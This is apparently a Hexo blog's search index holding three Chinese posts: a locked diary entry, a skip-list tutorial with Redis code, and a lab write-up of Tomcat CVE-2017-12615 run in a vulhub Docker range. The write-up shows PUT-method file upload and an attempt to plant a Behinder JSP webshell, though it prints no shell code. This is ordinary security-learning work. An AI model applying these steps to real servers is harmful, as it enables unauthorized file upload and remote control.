<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>小秘密</title>
    <url>/2025/07/01/jiami/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ff174143e4057c3c0c38c745ff9eaab5040b390543d5beda1b2b91d2ad3f155d">8857952509ef9895f61625fe2d594ef34e8575932da554fc738c5ab78a12561c638dc94d00ae82203b83738662a271408bc872e28c79a4ba7d40cae3f88da1e0</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>我的心里话</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构之跳表</title>
    <url>/2024/03/18/skipList/</url>
    <content><![CDATA[<blockquote>
<p>本次实验主要讲解了数据结构中的跳表以及应用</p>
</blockquote>
<h1 id="什么是跳表"><a href="#什么是跳表" class="headerlink" title="什么是跳表?"></a>什么是跳表?</h1><h2 id="网上回答"><a href="#网上回答" class="headerlink" title="网上回答"></a>网上回答</h2><p><font face="逐浪立楷" size=5>跳表是一种数据结构。它使得包含n个元素的有序序列的查找和插入操作的平均时间复杂度都是 O(logn)，快速的查询效果是通过维护一个多层次的链表实现的，且与前一层（下面一层）链表元素的数量相比，每一层链表中的元素的数量更少。</font></p>
<h2 id="跳表的查找"><a href="#跳表的查找" class="headerlink" title="跳表的查找"></a>跳表的查找</h2><p><font face="逐浪立楷" size=5>在跳表中查找，就是从最高层开始，水平地逐个比较直至当前节点的下一个节点大于等于目标节点，然后移动至下一层。重复这个过程直至到达第一层且无法继续进行操作。此时，若下一个节点是目标节点，则成功查找；反之，则元素不存在。这样一来，查找的过程中会跳过一些没有必要的比较，所以相比于有序链表的查询，跳表的查询更快。</font></p>
<h2 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h2><p><font face="逐浪花体" size=5>跳表就是多层的有序链表</font></p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/skipList/first.png" alt="引用自维基百科"><br>从图中可以看到， 跳跃表主要由以下部分构成：</p>
<ul>
<li>表头（head）：负责维护跳跃表的节点指针。</li>
<li>跳跃表节点：保存着元素值，以及多个层。</li>
<li>层：保存着指向其他元素的指针。高层的指针越过的元素数量大于等于低层的指针，为了提高查找的效率，程序总是从高层先开始访问，然后随着元素值范围的缩小，慢慢降低层次。</li>
<li>表尾：全部由 NULL 组成，表示跳跃表的末尾。</li>
</ul>
<h1 id="Redis中的跳表"><a href="#Redis中的跳表" class="headerlink" title="Redis中的跳表"></a>Redis中的跳表</h1><p>为了满足自身的功能需要， Redis 中的跳表进行了以下修改：</p>
<ol>
<li>允许重复的 score 值：多个不同的 member 的 score 值可以相同。</li>
<li>进行对比操作时，不仅要检查 score 值，还要检查 member ：当 score 值可以重复时，单靠 score 值无法判断一个元素的身份，所以需要连 member 域都一并检查才行。</li>
<li>每个节点都带有一个高度为 1 层的后退指针，用于从表尾方向向表头方向迭代：当执行 ZREVRANGE 或 ZREVRANGEBYSCORE 这类以逆序处理有序集的命令时，就会用到这个属性。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// Redis中的跳跃表的结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplist</span> &#123;</span></span><br><span class="line"><span class="comment">// 头节点，尾节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">header</span>, *<span class="title">tail</span>;</span></span><br><span class="line"><span class="comment">// 节点数量</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> length;</span><br><span class="line"><span class="comment">// 目前表内节点的最大层数</span></span><br><span class="line"><span class="type">int</span> level;</span><br><span class="line">&#125; </span><br><span class="line">zskiplist;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Redis跳表的节点的结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> &#123;</span></span><br><span class="line"><span class="comment">// member 对象</span></span><br><span class="line">robj *obj;</span><br><span class="line"><span class="comment">// 分值</span></span><br><span class="line"><span class="type">double</span> score;</span><br><span class="line"><span class="comment">// 后退指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">backward</span>;</span></span><br><span class="line"><span class="comment">// 层</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zskiplistLevel</span> &#123;</span></span><br><span class="line"><span class="comment">// 前进指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">forward</span>;</span></span><br><span class="line"><span class="comment">// 这个层跨越的节点数量</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> span;</span><br><span class="line"> &#125; level[];</span><br><span class="line">&#125;</span><br><span class="line"> zskiplistNode;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>比如在Redis中创建Zset并查找</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis&gt; ZADD s 6 x 10 y 15 z</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">redis&gt; ZRANGE s 0 -1 WITHSCORES</span><br><span class="line">1) <span class="string">&quot;x&quot;</span></span><br><span class="line">2) <span class="string">&quot;6&quot;</span></span><br><span class="line">3) <span class="string">&quot;y&quot;</span></span><br><span class="line">4) <span class="string">&quot;10&quot;</span></span><br><span class="line">5) <span class="string">&quot;z&quot;</span></span><br><span class="line">6) <span class="string">&quot;15&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在底层实现中， Redis 为 x 、 y 和 z 三个 member 分别创建了三个字符串，<br>值分别为 double 类型的 6 、 10 和 15 ， 然后用跳跃表将这些指针有序地保存起来， 形成这样一个跳跃表：</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/skipList/second.png"></p>
<h1 id="如何理解跳表"><a href="#如何理解跳表" class="headerlink" title="如何理解跳表"></a>如何理解跳表</h1><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/skipList/third.png"></p>
<p>首先我们将链表简化成图上我画的这样，最底层就是我们原始的链表，如果我们对其进行查找很显然就是普通的有序单链表查询时间复杂度是O(n)，然后跳表作者借鉴了我们数组中的二分查找思想，用空间换时间，以上便是作者理想的跳表结构。<br>比如我们现在要查找8</p>
<ol>
<li>从最高层索引3查找发现 1&lt;8&lt;9,直接从1向下跳到索引2</li>
<li>在索引2层先查找1&lt;5 &lt;8,接着比较  5 &lt; 8 &lt; 9,发现9大于8，此时从5向下跳到索引1</li>
<li>在索引1层5 &lt; 7 &lt; 8,接着比较7 &lt; 8 &lt; 9,此时就可以找到了8<br>通过以上查找分析我们可以看到，查找次数确实有了优化，只不过还不太明显，数据越多就越明显</li>
</ol>
<h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>一般是按照两个节点抽一个作为上一级索引的节点，因为我们毕竟是想要借鉴二分的思想达到log2n的时间复杂度,所以一般每层索引都会是上层索引节点个数的2倍</p>
<p>那第一级索引的结点个数大约就是n&#x2F;2，第二级索引的结点个数大约就是n&#x2F;4，第三级索引的结点个数大约就是n&#x2F;8，依次类推，也就是说，第h级索引的结点个数是第h-1级索引的结点个数的1&#x2F;2，那第h级索引结点的个数的就是n&#x2F;(2^h)</p>
<p>最高层一般就是2个节点了  此时 2 &#x3D; n &#x2F; 2^h，此时h &#x3D; log2n，根据我们以上我们的简化分析可以知道，每次索引比较的次数不会超过3次，那么我们的时间复杂度就是 <font color=red> 3 * h ~~  Ologn</font>   在我们的Redis中节点数达到256基本就可以实现时间复杂度就是Ologn了</p>
<h1 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h1><p>比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。</p>
<p>跳表的空间复杂度分析并不难，假设原始链表大小为n，那第一级索引大约有n&#x2F;2个结点，第二级索引大约有n&#x2F;4个结点，以此类推，每上升一级就减少一半，直到剩下2个结点。如果我们每层索引的结点数写出来，就是一个等比数列。这几级索引得到结点总和就是n&#x2F;2+n&#x2F;4+n&#x2F;8…+8+4+2&#x3D;n-2。所以，跳表的空间复杂度是O(n)。也就是说，如果将包含n个结点的单链表构造成跳表，我们需要额外再用接近n个结点的存储空间。</p>
<h1 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h1><p>跳表的增删改查都离不开查，我们都知道链表的增删就是找到位置后进行指针的修改，因此最重要的还是查的时间，因此增删的时间复杂度还是Ologn</p>
<h1 id="跳表索引动态更新"><a href="#跳表索引动态更新" class="headerlink" title="跳表索引动态更新"></a>跳表索引动态更新</h1><p>当我们不停地往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引结点之间数据非常多的情况。极端情况下，跳表还会退化成单链表。<br>作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中结点多了，索引结点就相应地增加一些，避免复杂度退化，以及查找，插入，删除操作性能下降。<br>如果你了解红黑树，AVL树这样平衡二叉树，你就知道他们是通过左右旋的方式保持左右子树的大小平衡（如果不了解也没关系，我们后面会讲），而跳表是通过随机函数来维护前面提到的“平衡性”。<br>当我们往跳表中插入数据的时候，我们可以选择同时将这个数据插入到部分索引层中。如何选择加入哪些索引层呢？<br>我们通过一个随机函数，来决定将这个结点插入到哪几级索引中，比如随机函数生成了值K,那我们就将这个结点添加到第一级到第K级这K级索引中。插入时首先从第一层插入 ，至于上面的层数需不需要插入，就是一个抛硬币的思想，正面一直插入，直到到反面的时候停止插入，因此我们其实也可以知道每一层是其上一层的一半。<br>随机函数的选择很有讲究，从概率上来讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。</p>
<table><tr><td bgcolor=yellow>
至此，所有讲解已结束，这是作为小白的一个小小记录，如果有帮助到你，我很开心，大佬勿喷~
当然如果对此文有问题可随时联系我哦~~~ 部分图片来自网络，如有侵权可联系我删除！
</td></tr></table>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>跳表</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat漏洞</title>
    <url>/2024/03/06/tomcatBug/</url>
    <content><![CDATA[<blockquote>
<p>此次实验通过Vmware及kali虚拟机实现并且用到了Docker部署靶场技术</p>
</blockquote>
<h1 id="VMWARE16安装以及Kali-2023-03安装"><a href="#VMWARE16安装以及Kali-2023-03安装" class="headerlink" title="VMWARE16安装以及Kali 2023.03安装"></a>VMWARE16安装以及Kali 2023.03安装</h1><p><a href="https://customerconnect.vmware.com/cn/downloads/info/slug/desktop_end_user_computing/vmware_workstation_pro/16_0">Vmware16安装网址</a><br><a href="http://old.kali.org/kali-images/">Kali安装网址</a><br>Vmware创建虚拟机教程我这里不再赘述，网上有很详细的教程，如果kali虚拟机下载慢可以联系我给你我的版本</p>
<h1 id="在Kali-2023-03上安装Docker准备部署环境"><a href="#在Kali-2023-03上安装Docker准备部署环境" class="headerlink" title="在Kali 2023.03上安装Docker准备部署环境"></a>在Kali 2023.03上安装Docker准备部署环境</h1><h2 id="kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录："><a href="#kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录：" class="headerlink" title="kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录："></a>kali本身apt很老，我们自己更新一下，先换个源，进入apt源的目录：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> vim/etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-1.png" alt="换源"></p>
<h2 id="安装https协议、CA证书、dirmngr"><a href="#安装https协议、CA证书、dirmngr" class="headerlink" title="安装https协议、CA证书、dirmngr"></a>安装https协议、CA证书、dirmngr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-1.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-2.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get install dirmngr</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-2-3.png"></p>
<h2 id="添加GPG密钥并添加更新源"><a href="#添加GPG密钥并添加更新源" class="headerlink" title="添加GPG密钥并添加更新源"></a>添加GPG密钥并添加更新源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | <span class="built_in">sudo</span> apt-key add -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-3.png"></p>
<h2 id="系统更新以及安装docker"><a href="#系统更新以及安装docker" class="headerlink" title="系统更新以及安装docker"></a>系统更新以及安装docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-4-1.png"></p>
<blockquote>
<p>注意：安装可能会有报错！！！</p>
</blockquote>
<h3 id="在Ubuntu中用apt-get安装软件，系统报出Unmet-dependencies错误"><a href="#在Ubuntu中用apt-get安装软件，系统报出Unmet-dependencies错误" class="headerlink" title="在Ubuntu中用apt-get安装软件，系统报出Unmet dependencies错误"></a>在Ubuntu中用apt-get安装软件，系统报出Unmet dependencies错误</h3><blockquote>
<p>Unmet dependencies. Try ‘apt –fix-broken install’ with no packages (or specify a solution)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt --fix-broken install</span><br><span class="line">$ <span class="built_in">sudo</span> apt-get update</span><br><span class="line">$ <span class="built_in">sudo</span> apt-get upgrade</span><br><span class="line">一键三连即可解决</span><br></pre></td></tr></table></figure>
<h3 id="解决Unmet-dependencies后执行以下命令"><a href="#解决Unmet-dependencies后执行以下命令" class="headerlink" title="解决Unmet dependencies后执行以下命令"></a>解决Unmet dependencies后执行以下命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install docker-ce</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-4-2.png"></p>
<blockquote>
<p>至此，恭喜你！Docker成功安装</p>
</blockquote>
<h2 id="启动Docker服务器"><a href="#启动Docker服务器" class="headerlink" title="启动Docker服务器"></a>启动Docker服务器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> service docker start</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-5.png"></p>
<h2 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-6.png"></p>
<h2 id="Docker安装测试"><a href="#Docker安装测试" class="headerlink" title="Docker安装测试"></a>Docker安装测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker version    <span class="comment">#查看docker的版本信息</span></span><br><span class="line">$ docker images    <span class="comment">#查看拥有的images</span></span><br><span class="line">$ docker ps    <span class="comment">#查看docker container</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-7-1.png" alt="版本信息"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-2-7-2.png" alt="image和container"></p>
<h2 id="配置docker拉取源"><a href="#配置docker拉取源" class="headerlink" title="配置docker拉取源"></a>配置docker拉取源</h2><blockquote>
<p>因为docker是外网，因此我们需要配置国内的加速镜像源，我这里使用阿里的镜像源</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://xxxxxxxxxx.mirror.aliyuncs.com&quot;</span>]  //此处需换成自己的阿里云加速镜像地址</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl restart docker</span><br><span class="line"><span class="comment"># 直接复制以上所有命令执行</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如遇到阿里源不能用的情况下，我又搜集了以下稳定且新的镜像源可用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置加速地址（以下三个中任意选一个使用）</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">I.&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.1panel.live&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">II.&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;https://docker.211678.top&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.1panel.live&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://hub.rat.dev&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://do.nark.eu.org&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerpull.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerproxy.cn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.awsl9527.cn&quot;</span></span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">III.&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重启Docker"><a href="#重启Docker" class="headerlink" title="重启Docker"></a>重启Docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl restart  docker</span><br></pre></td></tr></table></figure>
<h2 id="环境运行结束后要及时停止进程"><a href="#环境运行结束后要及时停止进程" class="headerlink" title="环境运行结束后要及时停止进程"></a>环境运行结束后要及时停止进程</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop （<span class="built_in">id</span>号）</span><br></pre></td></tr></table></figure>
<h1 id="基于Docker搭建靶场"><a href="#基于Docker搭建靶场" class="headerlink" title="基于Docker搭建靶场"></a>基于Docker搭建靶场</h1><h2 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h2><p><a href="https://github.com/vulhub/vulhub">靶场网址</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-1.png"></p>
<h2 id="下载完成，进入目录"><a href="#下载完成，进入目录" class="headerlink" title="下载完成，进入目录"></a>下载完成，进入目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> vulhub</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-2.png"></p>
<h2 id="我们可看到其中有各种环境-接下来我们就可以方便搭建各种漏洞环境了"><a href="#我们可看到其中有各种环境-接下来我们就可以方便搭建各种漏洞环境了" class="headerlink" title="我们可看到其中有各种环境,接下来我们就可以方便搭建各种漏洞环境了"></a>我们可看到其中有各种环境,接下来我们就可以方便搭建各种漏洞环境了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> struts2</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-1.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span> s2-057</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-2.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#然后执行命令，开启struts2-057漏洞</span></span><br><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-3.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker ps  <span class="comment">#查看此时运行的环境</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-4.png"></p>
<blockquote>
<p>接下来只需要访问对应ip地址+端口号就可以访问漏洞环境</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-3-3-5.png"></p>
<h1 id="CVE-2017-12615漏洞"><a href="#CVE-2017-12615漏洞" class="headerlink" title="CVE-2017-12615漏洞"></a>CVE-2017-12615漏洞</h1><blockquote>
<p>漏洞原理：由于配置不当（非默认配置），将配置文件conf&#x2F;web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传<br>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码<br>通过阅读 conf&#x2F;web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT &#x2F; DELETE 进行文件操控</p>
</blockquote>
<h2 id="首先进入CVE-2017-12615的docker环境"><a href="#首先进入CVE-2017-12615的docker环境" class="headerlink" title="首先进入CVE-2017-12615的docker环境"></a>首先进入CVE-2017-12615的docker环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d     <span class="comment">#启动环境</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-1-1.png" alt="启动环境"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-1-2.png" alt="查看此时环境"></p>
<h2 id="这里首先进入Docker里查看一下web-xml的代码，可以看到这里readonly设置为false，所以存在漏洞"><a href="#这里首先进入Docker里查看一下web-xml的代码，可以看到这里readonly设置为false，所以存在漏洞" class="headerlink" title="这里首先进入Docker里查看一下web.xml的代码，可以看到这里readonly设置为false，所以存在漏洞"></a>这里首先进入Docker里查看一下web.xml的代码，可以看到这里readonly设置为false，所以存在漏洞</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker <span class="built_in">exec</span> -ti 你的环境ID号 bash  <span class="comment">#进入Docker</span></span><br><span class="line">$ <span class="built_in">cat</span> conf/web.xml | grep <span class="built_in">readonly</span>   <span class="comment">#查看web.xml代码</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-2.png"></p>
<h2 id="此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法"><a href="#此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法" class="headerlink" title="此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法"></a>此时漏洞环境已经搭建成功，在8080端口进行抓包，这里发现是一个GET方法</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-3.png"></p>
<h2 id="这里首先测试一下，改为PUT方法写入一个test-txt，这里看到返回201，应该已经上传成功了"><a href="#这里首先测试一下，改为PUT方法写入一个test-txt，这里看到返回201，应该已经上传成功了" class="headerlink" title="这里首先测试一下，改为PUT方法写入一个test.txt，这里看到返回201，应该已经上传成功了"></a>这里首先测试一下，改为PUT方法写入一个test.txt，这里看到返回201，应该已经上传成功了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /lzj.txt HTTP/1.1 hello</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-4.png"></p>
<h2 id="这里进入docker查看一下已经写入成功了"><a href="#这里进入docker查看一下已经写入成功了" class="headerlink" title="这里进入docker查看一下已经写入成功了"></a>这里进入docker查看一下已经写入成功了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/tomcat/webapps/ROOT  <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-5.png"></p>
<h2 id="使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了"><a href="#使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了" class="headerlink" title="使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了"></a>使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里我们首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-6.png"></p>
